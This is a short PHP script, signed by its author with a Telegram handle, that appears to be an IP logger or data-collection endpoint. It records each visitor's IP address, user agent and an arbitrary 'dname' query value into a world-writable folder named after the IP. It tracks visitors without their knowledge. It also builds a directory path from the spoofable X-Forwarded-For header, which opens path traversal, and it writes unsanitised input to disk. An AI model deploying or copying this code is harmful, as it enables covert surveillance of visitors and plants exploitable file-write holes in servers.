<?php
//main variables
$ip = !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
$user_agent = !empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown User Agent';
mkdir($ip, 0777, true);
$file_path = $ip . "/info.txt";
$file = fopen($file_path, 'a');
fwrite($file, " \r \n " );

//get dname
header('Content-Type: text/html');
$dname = isset($_GET['dname']) ? $_GET['dname'] : 'No dname provided';
fwrite($file, $dname . "\n");

//get ip with user agent
fwrite($file, "IP Address: " . $ip . "\n\n");
fwrite($file, "User Agent: " . $user_agent . "\n\n");
fwrite($file, " ############################ " );
fclose($file);

//echo_me
echo "Data written successfully to file.";
?>
//by Ahmad Allam
//my telegram @echo_me